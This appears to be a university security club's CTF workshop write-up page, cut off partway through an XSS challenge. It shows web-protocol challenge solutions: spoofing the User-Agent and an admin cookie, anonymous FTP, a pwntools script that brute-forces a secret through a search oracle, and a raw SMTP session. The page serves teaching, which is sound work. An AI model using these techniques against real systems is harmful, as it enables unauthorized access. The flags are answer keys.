{"componentChunkName":"component---src-templates-blog-post-js","path":"/post/2020-03-11-workshop-02-ctf-writeups","result":{"data":{"markdownRemark":{"html":"<p>Slides for this workshop can be found on our GitHub <a href=\"https://github.com/umisc/workshops/blob/master/workshop-02-protocols-and-the-web/slides.pdf\">here</a>.</p>\n<p>Files for the challenges can also be found <a href=\"https://github.com/umisc/workshops/tree/master/workshop-02-protocols-and-the-web/challenges/\">here</a></p>\n<h1>Challenge Writeups</h1>\n<ul>\n<li><a href=\"#basics-i\">Basics I (50pts)</a></li>\n<li><a href=\"#basics-ii\">Basics II (50pts)</a></li>\n<li><a href=\"#basics-iii\">Basics III (50pts)</a></li>\n<li><a href=\"#hidden-ftp\">Hidden FTP (50pts)</a></li>\n<li><a href=\"#tcp-phonebook\">TCP Phonebook (100pts)</a></li>\n<li><a href=\"#misccats-flag-delivery-service\">Misccat's Flag Delivery Service (125pts)</a></li>\n<li><a href=\"#http-server-3000\">HTTP Server 3000 (250pts)</a></li>\n</ul>\n<h1>Basics I (50pts) <a name=\"basics-i\"></a></h1>\n<blockquote>\n<p>Send a POST request to <a href=\"http://ws-chall.umisc.info:2005/post_to_me\">http://ws-chall.umisc.info:2005/post_to_me</a> with a JSON body including the fields <code>\"postcode\"</code> and <code>\"flag\"</code>. <code>\"postcode\"</code> can be anything, and <code>\"flag\"</code> should be a true value.</p>\n<p>Author: Joseph</p>\n</blockquote>\n<h2>Solution</h2>\n<p>Using <a href=\"https://httpie.org/\">HTTPie</a>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ http POST ws-chall.umisc.info:2005/post_to_me postcode=1337 flag=&quot;yes please&quot;</code></pre></div>\n<p>which creates the request for us:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">POST /post_to_me HTTP/1.1\nAccept: application/json, */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nContent-Length: 42\nContent-Type: application/json\nHost: ws-chall.umisc.info:2005\nUser-Agent: HTTPie/2.0.0\n\n{\n    &quot;flag&quot;: &quot;yes please&quot;,\n    &quot;postcode&quot;: &quot;1337&quot;\n}</code></pre></div>\n<p>Response:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">HTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 31\nContent-Type: text/html; charset=utf-8\nDate: Tue, 10 Mar 2020 22:54:12 GMT\nETag: W/&quot;1f-34wkqV7iTtk4CEoC+tQnTelBuXc&quot;\nX-Powered-By: Express\n\nMISCCTF{h3r3_1s_a_fl4g_f0r_y0u}</code></pre></div>\n<hr>\n<h1>Basics II (50pts) <a name=\"basics-ii\"></a></h1>\n<blockquote>\n<p>You know the drill.</p>\n<p><a href=\"http://ws-chall.umisc.info:2005/spy_base\">http://ws-chall.umisc.info:2005/spy_base</a></p>\n<p>Author: Joseph</p>\n</blockquote>\n<h2>Solution</h2>\n<p>A simple GET request using <a href=\"https://httpie.org/\">HTTPie</a> (using <code>-p hHbB</code> to print both request and response headers and bodies) shows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ http -p hHbB ws-chall.umisc.info:2005/spy_base\nGET /spy_base HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHost: ws-chall.umisc.info:2005\nUser-Agent: HTTPie/2.0.0\n\n\n\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 48\nContent-Type: text/html; charset=utf-8\nDate: Tue, 10 Mar 2020 22:57:25 GMT\nETag: W/&quot;30-qHuoHb/xPSLNSJO2orJUN9QjvfM&quot;\nX-Powered-By: Express\n\nYou are &quot;HTTPie/2.0.0&quot;, not &quot;Agent Secure 1337&quot;!</code></pre></div>\n<p>We see that the server is telling us our <code>User-Agent</code> in the response. Changing the <code>User-Agent</code> header to <code>\"Agent Secure 1337\"</code> gives the flag:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ http -p hHbB ws-chall.umisc.info:2005/spy_base User-Agent:&quot;Agent Secure 1337&quot;\nGET /spy_base HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHost: ws-chall.umisc.info:2005\nUser-Agent: Agent Secure 1337\n\n\n\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 43\nContent-Type: text/html; charset=utf-8\nDate: Tue, 10 Mar 2020 22:58:36 GMT\nETag: W/&quot;2b-Ewe9HC3ad0du+hJEPtswscfJs3A&quot;\nX-Powered-By: Express\n\nMISCCTF{au7h3nt1c4t10n_w17h_us3r_4g3n7_b4d}</code></pre></div>\n<hr>\n<h1>Basics III (50pts) <a name=\"basics-iii\"></a></h1>\n<blockquote>\n<p>Free flag! (admins only)</p>\n<p><a href=\"http://ws-chall.umisc.info:2005/flag\">http://ws-chall.umisc.info:2005/flag</a></p>\n<p>Author: Joseph</p>\n</blockquote>\n<h2>Solution</h2>\n<p>A GET request to the page using <a href=\"https://httpie.org/\">HTTPie</a> reveals that an <code>\"admin\"</code> cookie is being set with value <code>0</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ http -p hHbB ws-chall.umisc.info:2005/flag\nGET /flag HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHost: ws-chall.umisc.info:2005\nUser-Agent: HTTPie/2.0.0\n\n\n\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 18\nContent-Type: text/html; charset=utf-8\nDate: Tue, 10 Mar 2020 23:00:56 GMT\nETag: W/&quot;12-PqGrlFX4yzUgFwX1IcXOIUPkcgY&quot;\nSet-Cookie: admin=0; Max-Age=1333333; Path=/; Expires=Thu, 26 Mar 2020 09:23:09 GMT\nX-Powered-By: Express\n\nYou are not admin!</code></pre></div>\n<p>Sending the same GET request, except with an <code>\"admin\"</code> cookie set to <code>1</code> gives the flag:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ http -p hHbB ws-chall.umisc.info:2005/flag Cookie:admin=1\nGET /flag HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCookie: admin=1\nHost: ws-chall.umisc.info:2005\nUser-Agent: HTTPie/2.0.0\n\n\n\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 24\nContent-Type: text/html; charset=utf-8\nDate: Tue, 10 Mar 2020 23:02:27 GMT\nETag: W/&quot;18-nRhz1ntYfuRePJpnNWiV57Dq8jM&quot;\nX-Powered-By: Express\n\nMISCCTF{c00k13_1s_yUmMY}</code></pre></div>\n<hr>\n<h1>Hidden FTP (50pts) <a name=\"hidden-ftp\"></a></h1>\n<blockquote>\n<p>There is a flag hidden in a file somewhere on this FTP server running on <code>ws-chall.umisc.info</code> on port <code>21</code>.</p>\n<p>Author: Joseph</p>\n</blockquote>\n<h2>Solution</h2>\n<p>Using the Inetutils FTP client (comes installed with most Linux distributions), we attempt an anonymous login to the FTP server and list the files using <code>ls -a</code> to show hidden files:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ ftp ws-chall.umisc.info 21\nConnected to ws-chall.umisc.info.\n220 MISC Is So Cool\nName (ws-chall.umisc.info:joseph): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&gt; ls -a\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    1 ftp      ftp          4096 Mar 08 22:13 .\ndrwxr-xr-x    1 ftp      ftp          4096 Mar 08 22:13 ..\n-rw-r--r--    1 ftp      ftp            27 Mar 08 22:13 .flag\n226 Directory send OK.\nftp&gt; get .flag\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for .flag (27 bytes).\n226 Transfer complete.\n27 bytes received in 0.000963 seconds (27.4 kbytes/s)\nftp&gt; 221 Goodbye.\n\n$ cat .flag\nMISCCTF{ftp_1s_a_b17_l4m3}</code></pre></div>\n<hr>\n<h1>TCP Phonebook (100pts) <a name=\"tcp-phonebook\"></a></h1>\n<blockquote>\n<p>You've been granted exclusive access to this fancy new phonebook service running over TCP! It's not complete yet though; all it returns is the number of matches for your search. But I'm sure that won't stop you from finding some interesting things!</p>\n<p><code>nc ws-chall.umisc.info 2002</code></p>\n<p>Author: Joseph</p>\n</blockquote>\n<h2>Solution</h2>\n<p>With not much information given, we connect to the service using <a href=\"https://linux.die.net/man/1/nc\">netcat</a>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ nc ws-chall.umisc.info 2002\nTCP Phonebook V0.1.0\nQuit with -quit-\nAvailable search fields:\nfirst_name\nlast_name\nemail\ngender\nfavourite_animal\naddress\ncatch_phrase\ncompany</code></pre></div>\n<p>Inputting something random results in <code>\"Invalid search field\"</code> being returned and the connection closing:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ nc ws-chall.umisc.info 2002\nTCP Phonebook V0.1.0\nQuit with -quit-\nAvailable search fields:\nfirst_name\nlast_name\nemail\ngender\nfavourite_animal\naddress\ncatch_phrase\ncompany\nasdf\nInvalid search field</code></pre></div>\n<p>If we input a valid search field, the server waits for another input which is our search query (here, our inputs are <code>\"favourite_animal\"</code> and <code>\"dog\"</code>):</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">nc ws-chall.umisc.info 2002\nTCP Phonebook V0.1.0\nQuit with -quit-\nAvailable search fields:\nfirst_name\nlast_name\nemail\ngender\nfavourite_animal\naddress\ncatch_phrase\ncompany\nfavourite_animal\ndog\nMatches: 1</code></pre></div>\n<p>So we can search through a specific search field and the service will return how many matches are in the database. Assuming the flag is in one of the fields, we can check each one and see when the search for <code>\"MISCCTF{\"</code> returns a positive match. From there, we can bruteforce each letter of the flag format to eventually recover the full flag.</p>\n<p>A scripting programming language like Python or Bash will be very helpful for this challenge. The solution script uses <a href=\"https://github.com/Gallopsled/pwntools\">pwntools</a>, a Python library that helps to make the process of interacting with TCP servers easier (amongst other things).</p>\n<p>Solution script:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token comment\"># set up the connection</span>\nconn <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'ws-chall.umisc.info'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2002</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># discard the first 3 lines</span>\n<span class=\"token punctuation\">[</span>conn<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token comment\"># find the correct search field</span>\nsearch_fields <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>splitlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsf <span class=\"token operator\">=</span> <span class=\"token string\">b''</span>\n<span class=\"token keyword\">for</span> s <span class=\"token keyword\">in</span> search_fields<span class=\"token punctuation\">:</span>\n    conn<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n    conn<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'MISCCTF{'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> conn<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">:</span>\n        sf <span class=\"token operator\">=</span> s\n        <span class=\"token keyword\">break</span>\n\nalphabet <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdefghijklmnopqrstuvwxyz{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">'MISCCTF{'</span>\n\ni <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">while</span> flag<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'}'</span><span class=\"token punctuation\">:</span>\n    guess <span class=\"token operator\">=</span> flag <span class=\"token operator\">+</span> alphabet<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n    conn<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>sf<span class=\"token punctuation\">)</span>\n    conn<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> conn<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">:</span>\n        flag <span class=\"token operator\">=</span> guess\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n        i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></code></pre></div>\n<p>which results in the output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">[+] Opening connection to ws-chall.umisc.info on port 2002: Done\nMISCCTF{w\nMISCCTF{wh\nMISCCTF{wh4\nMISCCTF{wh47\nMISCCTF{wh47_\nMISCCTF{wh47_d\nMISCCTF{wh47_d0\nMISCCTF{wh47_d0_\nMISCCTF{wh47_d0_w\nMISCCTF{wh47_d0_w3\nMISCCTF{wh47_d0_w3_\nMISCCTF{wh47_d0_w3_h\nMISCCTF{wh47_d0_w3_h4\nMISCCTF{wh47_d0_w3_h4v\nMISCCTF{wh47_d0_w3_h4v3\nMISCCTF{wh47_d0_w3_h4v3_\nMISCCTF{wh47_d0_w3_h4v3_h\nMISCCTF{wh47_d0_w3_h4v3_h3\nMISCCTF{wh47_d0_w3_h4v3_h3r\nMISCCTF{wh47_d0_w3_h4v3_h3r3\nMISCCTF{wh47_d0_w3_h4v3_h3r3_\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0h\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0h_\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0h_a\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0h_a_\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0h_a_f\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0h_a_fl\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0h_a_fl4\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0h_a_fl4g\nMISCCTF{wh47_d0_w3_h4v3_h3r3_0h_a_fl4g}</code></pre></div>\n<hr>\n<h1>Misccat's Flag Delivery Service (125pts) <a name=\"misccats-flag-delivery-service\"></a></h1>\n<blockquote>\n<p>Misccat is delivering flags to people with good manners! Simply send an email to Misccat (<code>misccat@mail.umisc.info</code>) and include a SMTP header named <code>\"flag\"</code> with value <code>\"yes please!\"</code> via the SMTP server running on <code>ws-chall.umisc.info</code> on port <code>2525</code>.\nMake sure you put Misccat's email in the <code>\"To\"</code> header and include your email in the <code>\"From\"</code> header so Misccat knows where to send the flag to!</p>\n<p>Author: Joseph</p>\n</blockquote>\n<h2>Solution</h2>\n<p>Using <a href=\"https://linux.die.net/man/1/nc\">netcat</a> to connect to the SMTP server and following the standard SMTP procedure to send an email (with <code>-C</code> to send <code>CRLF</code> line-endings):</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ nc -C ws-chall.umisc.info 2525\n220 f9f2f47a8067 ESMTP\nHELO umisc.info\n250 f9f2f47a8067 Nice to meet you, *******\nMAIL FROM:&lt;joseph@umisc.info&gt;\n250 Accepted\nRCPT TO:&lt;misccat@mail.umisc.info&gt;\n250 Accepted\nDATA\n354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\nTo:&lt;misccat@mail.umisc.info&gt;\nFrom:&lt;joseph@umisc.info&gt;\nflag: yes please!\n\ngive me the flag!\n.\n250 OK: message queued</code></pre></div>\n<p>After a few seconds, we get an email from Misccat containing the flag!</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 501px;\"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/aa6a61cba1a2d0da26b7e7895625c972/55811/mail-flag.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABK0lEQVQoz5WS226EMAxE+f+/62MfKrVls9yTkAsQYJl6sl3USu3DWjIeB+V4Eiii13D6HRdVo/wscbkoDIOGbd7Qf7wgjANCnBFC/DOnaUbbdmiaNvfFFAyWcMW1aqCUghKg1haTraDVK6IziLIpxulMQuZ5yXpJCXXdoKrq3BcpbTDWw3uPcRzhRgc9DHA+gnG7HZK3X7muq0AnbNuGZVkEPuM4DtFJgPJom7u7sixhtJYjtLDW4L8glKB937EIzBoj8BUprSg4jc4GccVKpyGErK215/ooeorxPAkrXf2ME8iNnMJKd33Xoe97GFmjzlV6vqfmEF4LHTIe4AzkPdwX8XQQdL/jI+skHyg7dM7BS/Ko1I8hzwZZBb/Mum4C2b9zy/2zyX38lb4AdA66puYK/XMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"mail-flag.png\"\n        title=\"mail-flag.png\"\n        src=\"/static/aa6a61cba1a2d0da26b7e7895625c972/55811/mail-flag.png\"\n        srcset=\"/static/aa6a61cba1a2d0da26b7e7895625c972/8a4e8/mail-flag.png 150w,\n/static/aa6a61cba1a2d0da26b7e7895625c972/5a46d/mail-flag.png 300w,\n/static/aa6a61cba1a2d0da26b7e7895625c972/55811/mail-flag.png 501w\"\n        sizes=\"(max-width: 501px) 100vw, 501px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<hr>\n<h1>HTTP Server 3000 (250pts) <a name=\"http-server-3000\"></a></h1>\n<blockquote>\n<p>I just listened to a very good presentation on web stuff so I've decided to build a cool website and implement my very own HTTP server called \"HTTP Server 3000\"! It's pretty janky and the whole url encoding/decoding business still confuses me, but I'm sure it'll be fine.</p>\n<p><a href=\"http://ws-chall.umisc.info:2001\">http://ws-chall.umisc.info:2001</a></p>\n<p>Author: Joseph</p>\n</blockquote>\n<h2>Solution</h2>\n<p>We begin by taking a look at the main pages of the website. Each screenshot is accompanied by an equivalent request using <a href=\"httpie.org/\">HTTPie</a> so we can see what headers are being sent.</p>\n<h4>Index page</h4>\n<p>The home page contains a single input field and a button, asking us for a username to log in with:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 600px;\"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/cb211141fe5dd346cc07ee6d2d7d143d/7e4a6/index-page.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0UlEQVQ4y+2PXQsBQRSG5+cgLMWFNqLccOXrRm7c8kt8LsuusCsl5Q+inf16zWwpNkvkjree6cy8p/ecIY1WF7VmB+VqG6VKG7liHaFYBuG4iIggenUQvCeazEJI5ZFIFxBPFUAUVcN4soCsrNEbyBj2Z5DkFbvrDA0j5g3GCkO9YyipmM41zFQdS22HzfaApb4HoYYBk1KYpsmgoNTA+XSE69j4RIQfLsd1vQfHcWCwIZZlebVtB8N9P4QH+bnqkfcK8szEzeZvffmb+gf+QuAFp/LDbKlGBjEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"index-page.png\"\n        title=\"index-page.png\"\n        src=\"/static/cb211141fe5dd346cc07ee6d2d7d143d/0a47e/index-page.png\"\n        srcset=\"/static/cb211141fe5dd346cc07ee6d2d7d143d/8a4e8/index-page.png 150w,\n/static/cb211141fe5dd346cc07ee6d2d7d143d/5a46d/index-page.png 300w,\n/static/cb211141fe5dd346cc07ee6d2d7d143d/0a47e/index-page.png 600w,\n/static/cb211141fe5dd346cc07ee6d2d7d143d/1cfc2/index-page.png 900w,\n/static/cb211141fe5dd346cc07ee6d2d7d143d/7e4a6/index-page.png 952w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">GET / HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHost: ws-chall.umisc.info:2001\nUser-Agent: HTTPie/2.0.0\n\n\n\nHTTP/1.1 200 OK\nConnection: closed\nServer: HTTP Server 3000\n\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Cool Website&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Login with your username: &lt;form action=&quot;/login&quot; method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div>\n<h4>Logged in page</h4>\n<p>When we enter some input, we are given a page telling us that we've logged in, which includes a link to the dashboard:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 600px;\"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/b650eabab0f88d52202fd864babf53bb/7e4a6/logged-in.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA1ElEQVQ4y+3N3UoCQRTA8XmcLNsM9CJNSug+ShD0AaJeo7BQ221rXV38QJCgV1x2dvx7HGRRryS89MBvzgecM6reeuGh+cyj5PvGEzd3dc4KZXGdORU5p8zJ+cpVJudUyF9WuSjeUijVcIo1VBCO8Pwh7teATu+bj7bPa7tP5zMQfd7ePavnDXD9iK7Mum4ofYgfjPkJJ0TjOdPZH9HkF6V1Qppq4jjGmFRqSBJszWJBqrW1b6jNRvaFPBibrfXcGCOfbVvNdqls8UAUB47jwePBf8QSDKDDkZc/F2EAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"logged-in.png\"\n        title=\"logged-in.png\"\n        src=\"/static/b650eabab0f88d52202fd864babf53bb/0a47e/logged-in.png\"\n        srcset=\"/static/b650eabab0f88d52202fd864babf53bb/8a4e8/logged-in.png 150w,\n/static/b650eabab0f88d52202fd864babf53bb/5a46d/logged-in.png 300w,\n/static/b650eabab0f88d52202fd864babf53bb/0a47e/logged-in.png 600w,\n/static/b650eabab0f88d52202fd864babf53bb/1cfc2/logged-in.png 900w,\n/static/b650eabab0f88d52202fd864babf53bb/7e4a6/logged-in.png 952w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">GET /login?username=hello HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHost: ws-chall.umisc.info:2001\nUser-Agent: HTTPie/2.0.0\n\n\n\nHTTP/1.1 200 OK\nConnection: closed\nContent-Type: text/html\nServer: HTTP Server 3000\nSet-Cookie: username=hello; path=/;\n\n&lt;html&gt;Thanks for logging in! Click &lt;a href=&quot;/dashboard&quot;&gt;here&lt;/a&gt; to go to your dashboard...&lt;/html&gt;</code></pre></div>\n<h4>Dashboard page</h4>\n<p>Clicking the link to go to the dashboard, we see a big font that says <code>\"Hello, &#x3C;username>!\"</code> and an input form to share a link with others on the website (strong indicator that this is an XSS challenge):</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 600px;\"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/33eb866117ce334e5554e6b0281872e7/7e4a6/dashboard.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABA0lEQVQ4y+2PUUvCUBzF78dpULPAHkqE9AMISgRCz1H0TdLpnJtONhEk6EtVuLe22PaksN27He9dhOBEmPbYgR/8//8L55xLbu+f0Ww/otV+QuPuAdV6E5J8DalU+UHMnJOzqxySXMHpRRWl8g3OL2uQyzUQfWRjoFtQtQmU/giaaqLbH2c3QW8w4ZjoKAZeFJ1jZHR6BtShBc2wYVpzTGdvMO1XEMdx4LpfcBYLrFZLHCtCKUMcx6CUIopiTpTtAsYYkiQBE7A84m0bEgQBwjCE7/sQ87fn4fPjHZ7nZolpmhaC5DrzI+XtRNqvYaEv70rZeKeFTcm++gc1xB/r3/B4rQGOUMEzIQqFnAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"dashboard.png\"\n        title=\"dashboard.png\"\n        src=\"/static/33eb866117ce334e5554e6b0281872e7/0a47e/dashboard.png\"\n        srcset=\"/static/33eb866117ce334e5554e6b0281872e7/8a4e8/dashboard.png 150w,\n/static/33eb866117ce334e5554e6b0281872e7/5a46d/dashboard.png 300w,\n/static/33eb866117ce334e5554e6b0281872e7/0a47e/dashboard.png 600w,\n/static/33eb866117ce334e5554e6b0281872e7/1cfc2/dashboard.png 900w,\n/static/33eb866117ce334e5554e6b0281872e7/7e4a6/dashboard.png 952w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">GET /dashboard HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCookie: username=hello\nHost: ws-chall.umisc.info:2001\nUser-Agent: HTTPie/2.0.0\n\n\n\nHTTP/1.1 200 OK\nConnection: closed\nServer: HTTP Server 3000\nSet-Cookie: secret=0; path=/;\n\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Cool Website - Dashboard&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;Hello, &lt;span id=&quot;username&quot;&gt;&lt;/span&gt;!&lt;/h2&gt;&lt;/br&gt;&lt;/br&gt;Share a link with everyone on 